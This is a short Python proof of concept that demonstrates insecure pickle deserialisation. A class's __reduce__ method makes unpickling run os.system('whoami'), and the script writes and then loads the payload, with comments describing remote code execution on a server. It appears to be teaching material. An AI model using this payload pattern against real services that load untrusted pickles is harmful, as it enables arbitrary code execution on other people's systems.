import os
import pickle

class ImVulenrable():
    # tell pickle how to serialize object
    def __reduce__(self):
        return os.system, ('whoami',)


def serialize_exploit():
    payload = {'foo': 'bar'}
    f = open('demo.pickle', 'wb')
    notsafecode = pickle.dump(ImVulenrable(), f)
    return notsafecode

if __name__ == '__main__':
    serialize_exploit()

    # Image we sends this to server that reads directly from it
    with open('demo.pickle', 'rb') as handle:
        # BOOM...RCE!!
        pickle.load(handle)
